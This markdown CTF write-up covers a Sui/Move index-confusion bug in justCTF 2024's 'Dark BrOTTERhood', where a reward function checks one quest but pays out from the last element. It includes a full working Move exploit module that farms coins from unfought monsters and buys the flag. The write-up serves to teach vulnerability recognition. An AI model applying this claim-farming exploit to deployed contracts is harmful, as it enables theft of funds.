---
id: move-sui-validated-index-vs-consumed-element
category: WEB
tags: [blockchain, sui, move, not-evm, validated-index, index-confusion, check-vs-use, toctou, pop_back, wrong-element, vector, reward-farm, logic-bug, shared-object, justctf, dark-brotterhood, ottersec, solve-module]
tools: [Sui]
manuals: ["Manuals/Sui/3. Contexto para Claude.md"]
title: "Move/Sui: validated index ≠ consumed element (check on quest_id, pop_back pays another)"
difficulty: medium
created: 2026-10-08
updated: 2026-10-08
related: [toctou-decompression-overflow-validated-structure, web3-reentrancy-checks-effects-interactions]
---

> ⚠️ **Sui** chain, **Move** contracts (non-EVM). Toolchain = Sui CLI + Move (`sui move build`, publish
> a `solve` module that the launcher calls with the shared objects). **Not** Foundry/cast/web3. If Sui
> enters scope, a `Manuals/Sui/` is worthwhile. The pattern (check on one index, action on another
> element) transfers to any chain/language.

## How to recognize this pattern

- A function that takes a **user-supplied index/ID**, does the **validation** using that index
  (`borrow(vec, id)` → checks status/owner), but the **action** (pay, remove, transfer) operates on
  **another element** (typically `pop_back`/`vec[fixed]`/the last item), not on the validated `id`.
- Result: you satisfy the check on a "good" item and reap the effect on "bad" items repeatedly. It's a
  check-vs-use / index confusion (a cousin of TOCTOU).
- Game/economy symptom: the goal requires accumulating X (buy the flag for 1337) but the legit means
  cap the gain (reward ≤ 37, power resets). The "profit" comes from the index bug, not the mechanics.

## Method

Reference case: justCTF 2024, Dark BrOTTERhood (Sui/Move, OtterSec). `buy_flag` costs 1337, you start
with 137. `get_the_reward` validates the index but pays the `pop_back`:

```move
public fun get_the_reward(vault, board, player, quest_id: u64, ctx) {
    let quest_to_claim = vector::borrow_mut(&mut board.quests, quest_id);
    assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);   // CHECKS quest_id
    let monster = vector::pop_back(&mut board.quests);               // CONSUMES the last (≠ quest_id!)
    let Monster { fight_status:_, reward, power:_ } = monster;
    let coins = coin::split(&mut vault.cash, (reward as u64), ctx);
    coin::join(&mut player.coins, coins);
}
```
If `quest_id` ≠ the last index, the `FINISHED` check is NOT done on the monster that pays.

### Exploit (`solve` module in Move)

1. `buy_sword` (power 10→100, costs 137).
2. `find_a_monster` + `fight_monster(0)` + `return_home(0)` → index 0 becomes `FINISHED`.
3. Fill the board with monsters (`find_a_monster`, limit 25) and call `get_the_reward(..., 0)` in a
   loop: the check reads index 0 (always FINISHED), but each call does `pop_back` on an unfought monster
   and pays the reward → farm coins without fighting.
4. Repeat find/claim until `coins >= 1337` → `buy_flag` → `prove`.

```move
module solve::solve {
    use challenge::Otter::{Self, OTTER};
    use sui::random::Random;
    public fun solve(_vault:&mut Otter::Vault<OTTER>, _board:&mut Otter::QuestBoard,
                     _player:&mut Otter::Player, _r:&Random, _ctx:&mut TxContext) {
        Otter::buy_sword(_vault,_player,_ctx);
        Otter::find_a_monster(_board,_r,_ctx);
        Otter::fight_monster(_board,_player,0);
        Otter::return_home(_board,0);
        let mut i=0;
        while (i<=10) { i=i+1;
            let mut j=0; while (j<10){ Otter::find_a_monster(_board,_r,_ctx); j=j+1; };
            let mut y=0; while (y<10){ Otter::get_the_reward(_vault,_board,_player,0,_ctx); y=y+1; };
        };
        let flag = Otter::buy_flag(_vault,_player,_ctx);
        Otter::prove(_board, flag);
    }
}
```
Compile (`sui move build`) and submit to the launcher (`nc db.nc.jctf.pro 31337`); it publishes/calls
`solve` with the shared objects and returns the flag. Validate it against the CTF's flag format.

## Gotchas

- **You can't forge the validated object:** the `QuestBoard` has to be the one created by the contract
  (a `has key, store` type with a `UID`), not yours. The attack vector is the index, not a fake board.
- **Vector limit:** `find_a_monster` has a `QUEST_LIMIT` (25); farm in batches (fill, drain, repeat).
- **Shared objects in Sui:** `solve` receives `&mut Vault/Board/Player` + `&Random` from the launcher;
  you don't instantiate them, you only operate on them.
- Transfers to EVM: a `claim(id)` that validates `items[id]` but deletes/pays `items.pop()`/`items[0]`
  is the same bug: reward farm/double-spend.

## Transferable lesson

Always match **what is checked** with **what is used**: if the validation reads `vec[id]` and the
mutation touches another element (`pop_back`, fixed index, last), there's an exploitable gap. Same
family as `Arsenal/PWN/toctou-decompression-overflow-validated-structure.md` (validator↔consumer read
different targets). The golden question for any `claim/redeem/withdraw(id)`: "is the validated `id` the
SAME element that's consumed?".

## Related / Cross-reference

- `Arsenal/PWN/toctou-decompression-overflow-validated-structure.md`: check-vs-use in a binary.
- (pending) `Manuals/Sui/` if Sui/Move enters scope: Sui CLI, Move, shared objects, the solve module,
  the launcher.
